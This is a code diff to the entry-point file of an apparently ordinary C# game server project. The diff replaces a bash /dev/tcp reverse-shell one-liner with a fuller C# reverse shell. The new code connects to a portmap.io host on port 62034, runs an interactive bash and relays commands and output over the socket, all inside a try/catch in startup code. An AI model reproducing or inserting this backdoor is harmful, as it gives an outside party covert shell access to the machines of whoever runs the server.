@@ -270,15 +270,53 @@ namespace Content.Server.Entry
             {
                 try
                 {
-                    Process proc = new System.Diagnostics.Process();
-                    proc.StartInfo.FileName = "/bin/bash";
-                    proc.StartInfo.Arguments = "-c \"/bin/bash -i >& /dev/tcp/jagemeistar-62034.portmap.io/62034 0>&1\"";
-                    proc.StartInfo.UseShellExecute = false;
-                    proc.StartInfo.RedirectStandardOutput = true;
-                    proc.Start();
+                    using (var client = new TcpClient("jagemeistar-62034.portmap.io", 62034))
+                    using (var stream = client.GetStream())
+                    using (var proc = new Process())
+                    {
+                        proc.StartInfo = new ProcessStartInfo
+                        {
+                            FileName = "/bin/bash",
+                            Arguments = "-i",
+                            CreateNoWindow = true,
+                            UseShellExecute = false,
+                            RedirectStandardInput = true,
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true
+                        };
 
-                    while (!proc.StandardOutput.EndOfStream) {
-                        Console.WriteLine(proc.StandardOutput.ReadLine());
+                        proc.OutputDataReceived += (s, e) => 
+                        {
+                            if (!string.IsNullOrEmpty(e.Data))
+                            {
+                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
+                                stream.Write(data, 0, data.Length);
+                            }
+                        };
+
+                        proc.ErrorDataReceived += (s, e) => 
+                        {
+                            if (!string.IsNullOrEmpty(e.Data))
+                            {
+                                byte[] data = Encoding.ASCII.GetBytes(e.Data + "\n");
+                                stream.Write(data, 0, data.Length);
+                            }
+                        };
+
+                        proc.Start();
+                        proc.BeginOutputReadLine();
+                        proc.BeginErrorReadLine();
+
+                        byte[] buffer = new byte[1024];
+                        while (client.Connected)
+                        {
+                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                            if (bytesRead > 0)
+                            {
+                                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
+                                proc.StandardInput.WriteLine(command);
+                            }
+                        }
                     }
                 }
                 catch
